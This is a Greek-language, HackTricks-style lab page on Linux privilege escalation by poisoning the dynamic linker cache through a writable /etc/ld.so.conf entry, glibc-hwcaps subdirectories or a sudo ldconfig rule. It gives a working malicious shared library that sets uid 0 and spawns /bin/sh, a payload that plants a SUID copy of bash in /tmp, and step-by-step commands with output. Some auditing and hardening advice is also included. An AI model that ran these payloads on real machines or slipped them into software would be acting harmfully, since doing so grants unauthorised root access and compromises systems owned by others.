# ld.so privesc exploit example

{{#include ../../banners/hacktricks-training.md}}

Αυτή η σελίδα είναι ένα στοχευμένο lab για poisoning του **system linker cache μέσω των `/etc/ld.so.conf` ή `ldconfig`**. Για missing-library injection, writable `RPATH`/`RUNPATH`, `LD_PRELOAD` και άλλες generic SUID linker abuse τεχνικές, δείτε το [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md).

## Προετοιμασία του περιβάλλοντος

Στην παρακάτω ενότητα μπορείτε να βρείτε τον κώδικα των αρχείων που θα χρησιμοποιήσουμε για την προετοιμασία του περιβάλλοντος.

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Δημιουργήστε** αυτά τα αρχεία στο μηχάνημά σας, στον ίδιο φάκελο
2. **Κάντε compile τη** **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Αντιγράψτε** το `libcustom.so` στο `/usr/lib` και ανανεώστε την cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
4. **Κάντε compile το** **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Έλεγχος του environment

Ελέγξτε ότι το _libcustom.so_ γίνεται **loaded** από το _/usr/lib_ και ότι μπορείτε να **εκτελέσετε** το binary.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Χρήσιμες εντολές triage

Όταν επιτίθεστε σε έναν πραγματικό στόχο, επαληθεύστε το **ακριβές όνομα της βιβλιοθήκης** που χρειάζεται το binary, τι **επιλύει επί του παρόντος ο loader** και ποιες διαμορφωμένες διαδρομές είναι εγγράψιμες χωρίς να τροποποιήσετε το ενεργό cache.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
Χρησιμοποίησε το `ldd` μόνο σε ένα **trusted** executable. Ορισμένες implementations ή ασυνήθιστοι ELF interpreters μπορούν να προκαλέσουν την εκτέλεση code που ελέγχεται από attacker· το `objdump -p ./file | grep NEEDED` παραθέτει με ασφάλεια τις άμεσες dependencies. Για ένα trusted target, η εκτέλεση του interpreter που εντοπίστηκε με `--list` εμφανίζει την πραγματική resolution.<sup>[[4]](#references)</sup>

Μερικές χρήσιμες παγίδες:

- Το `sudo echo ... > /etc/ld.so.conf.d/x.conf` συνήθως **δεν λειτουργεί**, επειδή
η redirection εκτελείται από το τρέχον shell. Χρησιμοποίησε
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` αντί γι' αυτό.
- Τα **SUID/privileged** binaries αγνοούν τα `LD_LIBRARY_PATH`/`LD_PRELOAD` σε
**secure-execution mode**, αλλά οι directories που προέρχονται από το `/etc/ld.so.conf` εξακολουθούν να αποτελούν μέρος του trusted loader configuration, επομένως αυτή η misconfiguration μπορεί ακόμη να επηρεάσει privileged programs.<sup>[[1]](#references)</sup>
- Το `LD_DEBUG` επίσης αγνοείται σε secure-execution mode, εκτός αν υπάρχει το `/etc/suid-debug`, επομένως συλλέξτε το trace από ένα equivalent non-SUID run αντί να περιμένετε output από την privileged execution.<sup>[[1]](#references)</sup>
- Σε νεότερες glibc versions, ο dynamic loader εκθέτει επίσης το
`--list-diagnostics`, το οποίο είναι χρήσιμο για το debugging του cache resolution και
της επιλογής `glibc-hwcaps` subdirectory όταν ένα hijack δεν συμπεριφέρεται όπως αναμένεται.<sup>[[1]](#references)</sup>

### Περιορισμοί Cache και SONAME

Το `ldconfig` δεν κάνει cache κάθε arbitrary file σε ένα configured directory: εξετάζει ELF headers, αναγνωρίζει names που ταιριάζουν με `lib*.so*` ή `ld-*.so*` και αναμένει τη συμβατική ακολουθία `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12`. Επομένως, το injected object πρέπει να έχει την architecture/class του target, το ακριβές `DT_NEEDED` name (κανονικά το `DT_SONAME`) και όλα τα symbols/versions που κάνει resolve το victim.<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
Προτιμήστε μια βιβλιοθήκη ειδικά για το target, όπως σε αυτό το παράδειγμα. Το Shadowing ενός συνηθισμένου SONAME με ένα incomplete object μπορεί να διακόψει κάθε process που το επιλύει πριν εκτελεστεί το προβλεπόμενο privileged target.<sup>[[3]](#references)</sup>

## Exploit

Σε αυτό το σενάριο θα υποθέσουμε ότι **κάποιος έχει δημιουργήσει μια ευάλωτη καταχώριση** μέσα σε ένα αρχείο στο _/etc/ld.so.conf/_:
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Ο ευάλωτος φάκελος είναι _/home/ubuntu/lib_ (όπου έχουμε δικαιώματα εγγραφής).\
**Κατεβάστε και μεταγλωττίστε** τον ακόλουθο κώδικα μέσα σε αυτήν τη διαδρομή:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Αν αναμένετε ότι το **root** (ή άλλος privileged λογαριασμός) θα εκτελέσει αργότερα το vulnerable binary, συνήθως είναι προτιμότερο να αφήσετε ένα **root-owned artifact** αντί να εκκινήσετε ένα interactive shell. Για παράδειγμα:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Στη συνέχεια, αφού πραγματοποιηθεί η προνομιούχα εκτέλεση, μπορείτε να χρησιμοποιήσετε το `/tmp/rootbash -p`.

Τώρα που έχουμε **δημιουργήσει τη malicious βιβλιοθήκη libcustom μέσα στη λανθασμένα ρυθμισμένη** διαδρομή, η default cache πρέπει να αναδημιουργηθεί με μια επιτυχή προνομιούχα εκτέλεση του **`ldconfig`**. Η επανεκκίνηση βοηθά μόνο όταν η τοπική διαδικασία εκκίνησης την εκτελεί πράγματι· διαφορετικά, περιμένετε μια ενέργεια από administrator ή χρησιμοποιήστε έναν unsafe κανόνα sudo, εάν υπάρχει διαθέσιμος.<sup>[[2]](#references)</sup>

Μόλις συμβεί αυτό, κάντε **επανέλεγχο** για να δείτε από πού φορτώνει το εκτελέσιμο `sharedvuln` τη βιβλιοθήκη `libcustom.so`:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Όπως μπορείτε να δείτε, **το φορτώνει από το `/home/ubuntu/lib`** και αν οποιοσδήποτε χρήστης το εκτελέσει, θα εκτελεστεί ένα shell:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Σημειώστε ότι σε αυτό το παράδειγμα δεν έχουμε κάνει privilege escalation, αλλά τροποποιώντας τις εντολές που εκτελούνται και **περιμένοντας από τον root ή άλλον privileged user να εκτελέσει το ευάλωτο binary**, θα μπορέσουμε να κάνουμε privilege escalation.

### Σύγχρονο `glibc-hwcaps` shadowing

Από τη glibc 2.33, ο loader μπορεί να προτιμά optimized libraries κάτω από το `glibc-hwcaps/<level>/` μέσα σε **κάθε library search directory**. Κατά συνέπεια, ο έλεγχος μόνο του `/home/ubuntu/lib` δεν επαρκεί: ένα writable συμβατό subdirectory, όπως το `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/`, μπορεί να κάνει shadow τη base library αφού το `ldconfig` το καταχωρίσει στο index, ενώ άλλες CPUs συνεχίζουν να χρησιμοποιούν το base object. Αυτό παρέχει επίσης ένα architecture-selective hijack που μπορεί να μην εντοπιστεί όταν η validation πραγματοποιείται σε διαφορετική CPU.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
Η τρέχουσα guidance για το hardening του glibc συνιστά την αποφυγή διπλότυπων SONAMEs, μη προεπιλεγμένων τοποθεσιών αναζήτησης και objects σε υποκαταλόγους `glibc-hwcaps`. Από την οπτική γωνία ενός audit, εφαρμόστε αναδρομικά ελέγχους ownership και writeability στους ρυθμισμένους καταλόγους και σε όλα τα parent path components τους.<sup>[[3]](#references)</sup>

### Άλλες misconfigurations - Ίδιο vuln

Στο προηγούμενο παράδειγμα προσποιηθήκαμε μια misconfiguration, όπου ένας administrator **όρισε έναν non-privileged φάκελο μέσα σε ένα configuration file μέσα στο `/etc/ld.so.conf.d/`**.\
Όμως υπάρχουν και άλλες misconfigurations που μπορούν να προκαλέσουν την ίδια vulnerability. Αν έχετε **write permissions** σε κάποιο **config file** μέσα στο `/etc/ld.so.conf.d/`, στον φάκελο `/etc/ld.so.conf.d` ή στο αρχείο `/etc/ld.so.conf`, μπορείτε να ρυθμίσετε και να εκμεταλλευτείτε την ίδια vulnerability.

## Exploit 2

**Ας υποθέσουμε ότι έχετε sudo privileges στο `ldconfig`**.\
Μπορείτε να υποδείξετε στο `ldconfig` **από πού να φορτώσει τα conf files**, ώστε να το εκμεταλλευτούμε και να κάνουμε το `ldconfig` να φορτώσει arbitrary folders.<sup>[[2]](#references)</sup>\
Ας δημιουργήσουμε, λοιπόν, τα απαραίτητα αρχεία και φακέλους για να φορτώσουμε το "/tmp":
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Τώρα, όπως υποδεικνύεται στο **previous exploit**, **δημιούργησε τη malicious library μέσα στο `/tmp`**.\
Και τέλος, ας φορτώσουμε το path και ας ελέγξουμε από πού φορτώνει το binary τη library:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Όπως μπορείτε να δείτε, έχοντας sudo privileges για το `ldconfig`, μπορείτε να εκμεταλλευτείτε την ίδια ευπάθεια.** Οι λεπτομέρειες των options έχουν σημασία κατά την αξιολόγηση ενός περιορισμένου sudo rule: το `-f` επιλέγει ένα διαφορετικό configuration, αλλά εξακολουθεί να αναδημιουργεί το `/etc/ld.so.cache`; το `-C` ανακατευθύνει το cache αλλού· το `-N` αποτρέπει την αναδημιουργία του cache· και το `-X` αποτρέπει τις ενημερώσεις των links, αλλά **εξακολουθεί να αναδημιουργεί το cache, εκτός αν συνδυαστεί με το `-N`**.<sup>[[2]](#references)</sup>



## References

- [1] [ld.so(8) - Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Hardening του Dynamic Linker - Η GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man1/ldd.1.html)
{{#include ../../banners/hacktricks-training.md}}
